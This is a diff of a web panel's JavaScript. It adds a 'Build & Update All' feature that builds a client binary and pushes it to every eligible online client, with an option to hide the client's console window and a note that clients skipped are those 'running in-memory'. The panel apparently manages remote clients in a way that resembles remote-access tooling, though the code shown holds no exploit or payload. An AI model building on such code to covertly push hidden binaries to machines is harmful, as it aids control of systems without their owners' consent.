+    buildUpdateAllBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
+  }
 
   buildStatus.classList.remove("hidden");
   buildStatusText.textContent = "Starting build...";
@@ -874,11 +1097,16 @@ async function startBuild(config) {
     buildStatus.querySelector("div").className =
       "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
     buildStatus.querySelector("i").className = "fa-solid fa-circle-xmark";
+    pendingUpdateAll = false;
   } finally {
     isBuilding = false;
     buildBtn.disabled = false;
     buildBtn.innerHTML =
       '<i class="fa-solid fa-hammer"></i> <span>Start Build</span>';
+    if (buildUpdateAllBtn) {
+      buildUpdateAllBtn.disabled = false;
+      buildUpdateAllBtn.innerHTML = '<i class="fa-solid fa-arrow-up-from-bracket"></i> <span>Build & Update All</span>';
+    }
   }
 }
 
@@ -946,6 +1174,12 @@ async function streamBuildOutput(buildId, config = {}) {
 
               buildResults.classList.remove("hidden");
               displayBuild(buildData);
+
+              // Auto-push update if "Build & Update All" was used
+              if (pendingUpdateAll) {
+                pendingUpdateAll = false;
+                await pushUpdateToAllClients(data.buildId, pendingUpdateHideWindow);
+              }
             }
 
             reader.cancel();
@@ -1047,13 +1281,7 @@ function showBuildFiles(files, buildId, expiresAt) {
     fileInfo.appendChild(fileSize);
 
     const downloadBtn = document.createElement("a");
-    downloadBtn.href = file.tempShUrl || `/api/build/download/${encodeURIComponent(file.name)}`;
-    if (file.tempShUrl) {
-      downloadBtn.target = "_blank";
-      downloadBtn.rel = "noopener noreferrer";
-    } else {
-      downloadBtn.download = "";
-    }
+    downloadBtn.href = `/api/build/download/${encodeURIComponent(file.name)}`;
     downloadBtn.className =
       "inline-flex items-center gap-1 px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm transition-colors";
     downloadBtn.innerHTML = '<i class="fa-solid fa-download"></i> Download';
@@ -1364,13 +1592,8 @@ function showBuildFilesForContainer(build, containerId, timerId) {
     fileMeta.appendChild(fileText);
 
     const download = document.createElement("a");
-    download.href = file.tempShUrl || `/api/build/download/${encodeURIComponent(file.filename)}`;
-    if (file.tempShUrl) {
-      download.target = "_blank";
-      download.rel = "noopener noreferrer";
-    } else {
-      download.download = "";
-    }
+    download.href = `/api/build/download/${encodeURIComponent(file.filename)}`;
+    download.download = "";
     download.className =
       "px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg transition-colors flex items-center gap-2";
     const downloadIcon = document.createElement("i");
@@ -1390,5 +1613,149 @@ function showBuildFilesForContainer(build, containerId, timerId) {
     updateExpirationTimer(timerEl, build.expiresAt);
 
     setInterval(() => updateExpirationTimer(timerEl, build.expiresAt), 60000);
+  }
+}
+
+const buildUpdateAllBtn = document.getElementById("build-update-all-btn");
+const updateAllModal = document.getElementById("update-all-modal");
+const updateAllModalBody = document.getElementById("update-all-modal-body");
+const updateAllCancel = document.getElementById("update-all-cancel");
+const updateAllConfirm = document.getElementById("update-all-confirm");
+
+let pendingUpdateAll = false;
+let pendingUpdateHideWindow = false;
+
+function showUpdateAllModal() {
+  if (!updateAllModal) return;
+  updateAllModal.classList.remove("hidden");
+  updateAllModal.classList.add("flex");
+}
+
+function hideUpdateAllModal() {
+  if (!updateAllModal) return;
+  updateAllModal.classList.remove("flex");
+  updateAllModal.classList.add("hidden");
+  if (updateAllConfirm) {
+    updateAllConfirm.innerHTML = '<i class="fa-solid fa-hammer mr-1"></i> Build & Update';
+    updateAllConfirm.disabled = false;
+  }
+  if (updateAllCancel) {
+    updateAllCancel.textContent = "Cancel";
+  }
+}
+
+if (updateAllCancel) {
+  updateAllCancel.addEventListener("click", hideUpdateAllModal);
+}
+
+if (updateAllModal) {
+  updateAllModal.addEventListener("click", (e) => {
+    if (e.target === updateAllModal) hideUpdateAllModal();
+  });
+}
+
+if (buildUpdateAllBtn) {
+  buildUpdateAllBtn.addEventListener("click", async () => {
+    if (isBuilding) return;
+
+    const platformCheckboxes = form.querySelectorAll('input[name="platform"]:checked');
+    const platforms = Array.from(platformCheckboxes).map((cb) => cb.value);
+    if (platforms.length === 0) {
+      alert("Please select at least one platform to build");
+      return;
+    }
+
+    showUpdateAllModal();
+    updateAllConfirm.disabled = true;
+    updateAllModalBody.innerHTML = '<p class="text-slate-400"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Checking online clients...</p>';
+
+    try {
+      const res = await fetch("/api/build/update-eligible", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "include",
+        body: JSON.stringify({ platforms }),
+      });
+
+      if (!res.ok) {
+        const data = await res.json().catch(() => ({}));
+        updateAllModalBody.innerHTML = `<p class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i>${data.error || "Failed to check eligible clients"}</p>`;
+        return;
+      }
+
+      const data = await res.json();
+      let html = "";
+
+      html += `<p class="text-white"><i class="fa-solid fa-users mr-2 text-amber-400"></i><strong>${data.eligible}</strong> client(s) will receive the update after build.</p>`;
+      html += '<div class="mt-2 text-xs text-slate-400 space-y-1">';
+      html += `<p><i class="fa-solid fa-globe mr-1 text-blue-400"></i> ${data.totalOnline} total online client(s)</p>`;
+      if (data.skippedInMemory > 0) {
+        html += `<p><i class="fa-solid fa-memory mr-1 text-red-400"></i> ${data.skippedInMemory} client(s) will be skipped (running in-memory)</p>`;
+      }
+      if (data.skippedNoMatch > 0) {
+        html += `<p><i class="fa-solid fa-ban mr-1 text-slate-500"></i> ${data.skippedNoMatch} client(s) will be skipped (no matching platform)</p>`;
+      }
+      html += "</div>";
+
+      if (data.eligible === 0 && data.totalOnline === 0) {
+        html += '<p class="mt-3 text-xs text-slate-500">No clients are currently online. The build will still run but no updates will be sent.</p>';
+      }
+
+      html += '<p class="mt-3 text-xs text-amber-300/80"><i class="fa-solid fa-triangle-exclamation mr-1"></i>This will build the client and push the update to all eligible clients. Clients will restart automatically.</p>';
+      updateAllConfirm.disabled = false;
+
+      updateAllModalBody.innerHTML = html;
+    } catch (err) {
+      updateAllModalBody.innerHTML = `<p class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i>Error: ${err.message}</p>`;
+    }
+  });
+}
+
+if (updateAllConfirm) {
+  updateAllConfirm.addEventListener("click", () => {
+    hideUpdateAllModal();
+    pendingUpdateAll = true;
+    pendingUpdateHideWindow = !!form.querySelector('input[name="hide-console"]')?.checked;
+    form.requestSubmit();
+  });
+}
+
+async function pushUpdateToAllClients(buildId, hideWindow) {
+  addBuildOutput("\n── Pushing update to all eligible clients ──\n", "info");
+
+  try {
+    const res = await fetch("/api/build/update-all", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "include",
+      body: JSON.stringify({ buildId, hideWindow }),
+    });
+
+    const data = await res.json().catch(() => ({}));
+
+    if (!res.ok) {
+      addBuildOutput(`Update failed: ${data.error || "Unknown error"}\n`, "error");
+      return;
+    }
+
+    const succeeded = data.successCount || 0;
+    const total = data.totalOnline || 0;
+    const failed = (data.results || []).filter((r) => !r.ok);
+    const inMemoryCount = failed.filter((r) => r.reason === "in_memory").length;
+    const noMatchCount = failed.filter((r) => r.reason === "no_matching_build").length;
+
+    addBuildOutput(`Update sent to ${succeeded} of ${total} online client(s)\n`, "success");
+    if (inMemoryCount > 0) {
+      addBuildOutput(`  ${inMemoryCount} client(s) skipped (running in-memory)\n`, "warn");
+    }
+    if (noMatchCount > 0) {
+      addBuildOutput(`  ${noMatchCount} client(s) skipped (no matching build)\n`, "warn");
+    }
+    const otherFailed = failed.filter((r) => r.reason !== "in_memory" && r.reason !== "no_matching_build");
+    if (otherFailed.length > 0) {
+      addBuildOutput(`  ${otherFailed.length} client(s) failed for other reasons\n`, "warn");
+    }
+  } catch (err) {
+    addBuildOutput(`Update error: ${err.message}\n`, "error");
   }
 }
